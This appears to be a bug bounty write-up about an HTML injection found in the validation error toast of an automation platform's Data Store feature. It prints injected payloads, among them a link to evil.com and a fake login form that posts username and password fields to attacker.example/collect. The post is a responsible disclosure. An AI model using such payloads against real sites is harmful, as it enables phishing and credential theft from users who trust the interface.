# When a Toast Notification Becomes an Attacker-Controlled UI — $$$ Bug Bounty

- **Source URL:** https://medium.com/@abdelfattahelsabagh/when-a-toast-notification-becomes-an-attacker-controlled-ui-bug-bounty-48d3554d15a7
- **Fetched from:** https://medium.com/@abdelfattahelsabagh/when-a-toast-notification-becomes-an-attacker-controlled-ui-bug-bounty-48d3554d15a7?source=rss-370355c45e7a------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/14892 (id 14892)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Abdelfattah Elsabagh / Tue, 01 Sep 2026 01:03:18 GMT

بسم الله والصلاة والسلام على رسول الله سيدنا محمد صلي الله عليه وعلي اله وصحبه وسلم

اللَّهُمَّ انْفَعْنِي بِمَا عَلَّمْتَنِي، وَعَلِّمْنِي مَا يَنْفَعُنِي، وَزِدْنِي عِلْمًا

While hunting for vulnerabilities on a third-party platform, I came across an interesting behavior in one of its features.

The platform is a visual automation service that allows users to connect different applications and APIs, build automated workflows, and manage data used across those workflows. One of the available features is **Data Stores**, which can be used to store and manage data between workflow executions.

During my testing, I noticed that malformed input was reflected back to me through a **validation error toast notification**.

At first, it looked like a normal validation issue.

But when I started experimenting with the reflected value, I noticed something much more interesting:

**The application was rendering my input as HTML instead of treating it as plain text.**

That immediately turned a simple validation message into a potential **HTML Injection** vulnerability.

I reported the issue through the platform’s bug bounty program, and after review, the security team confirmed the unsafe HTML rendering and rewarded the report with **$$$**.

The interesting part started when I looked at how validation errors were handled inside the Data Store interface.

I created a Data Store and started testing the input fields with different types of unexpected values.

The field I was testing had a specific type — **Number**.

Naturally, entering a non-numeric value caused a validation error.

What caught my attention was that part of my input was reflected inside the resulting toast notification.

So I decided to stop testing it as a normal input-validation issue and start testing how the application handled **HTML markup**.

I began with simple HTML tags and gradually increased the complexity of the payload.

Eventually, I confirmed that HTML tags were actually being interpreted by the notification component.

That meant I wasn’t just controlling the text of the error message.

**I was controlling part of the UI itself.**

Once I confirmed the HTML Injection, the next question was:

***How much impact can I actually get from it?***

I didn’t want to stop at proving that a \<div> or \<h1> could be rendered.

I started testing different HTML capabilities to understand the boundaries of the injection.

One of the first things I tested was whether I could inject a clickable hyperlink:

\<a href="https://evil.com">HTML\</a>

The link was successfully rendered as a clickable element inside the notification.

That was an important escalation because the injected content was no longer limited to visual formatting.

An attacker could potentially place a user-controlled link directly inside a UI component that normally displays trusted application messages.

At this point, I started testing whether the injection could be pushed further.

I tested several possibilities, including payloads involving:

For example, I tested whether I could introduce a form-like interface:

\<form action="https://attacker.example/collect" method="POST">

\<input name="u">

\<input name="p" type="password">

\<input type="submit">

\</form>

I also tested external resource loading and other techniques that could potentially increase the impact.

However, these tests did **not** result in JavaScript execution or a confirmed SSRF.

So I didn’t want to overstate the vulnerability.

The confirmed capabilities were:

**HTML rendering + inline CSS + clickable links.**

And that was already enough to manipulate the trusted UI.

***To demonstrate the practical impact more clearly, I decided to build a more convincing proof of concept.***

I wanted the PoC to demonstrate that this wasn’t simply a cosmetic HTML rendering issue.

So I used inline CSS to significantly change the appearance of the toast notification.

**Step 1 — Create a Data Store**

**Step 2 — Configure the Field**

Make Sure that **Type is Number** and add the payload in the **Name**

**Step 3 — Trigger the Validation Error**

Try to add a new string item

at this point there is no error, But what if we try to save it in the file ?

Now it’s triggered

Step 4 — PoC

Try to add this code

\<div style="display:block;

padding:60px;

min-width:900px;

min-height:700px;

background:#fff;

border:10px solid #d32f2f;

border-radius:20px;

box-sizing:border-box;">

\<h1 style="margin:0;

font-size:90px;

color:#d32f2f;

font-family:Arial;

font-weight:bold;">

⚠ HTML Injection

\</h1>

\<hr style="margin:35px 0;border:5px solid #d32f2f;">

\<p style="font-size:42px;

padding:30px;

background:#000;

color:#fff;

font-weight:bold;">

Proof of Concept

\</p>

\<div style="margin-top:30px;

padding:35px;

border:5px dashed #d32f2f;

font-size:34px;

line-height:2;

background:#fff5f5;">

✔ User-controlled HTML is rendered.\<br>

✔ Inline CSS is applied.\<br>

✔ HTML formatting is preserved.\<br>

✔ Clickable links can be rendered.\<br>

\<a href="https://example.com">CLICK HERE\</a>

✔ UI can be manipulated.

\</div>

\<hr style="margin:35px 0;border:5px solid #d32f2f;">

\<h2 style="font-size:48px;color:#000;">

This is a safe HTML Injection Proof of Concept.

\</h2>

\</div>

Observe that the HTML is rendered directly inside the application’s notification like this

**Conclusion**

This was a good reminder that HTML Injection doesn’t always need JavaScript execution to become interesting. When attacker-controlled HTML reaches a trusted UI component, even a simple toast notification can become a powerful tool for UI manipulation and social engineering.

The issue was confirmed by the security team and rewarded with **$$$**.

Thanks for your time

**My linkedin** : [www.linkedin.com/in/abdelfattah-elsabagh-90147b2a3](http://www.linkedin.com/in/abdelfattah-elsabagh-90147b2a3)
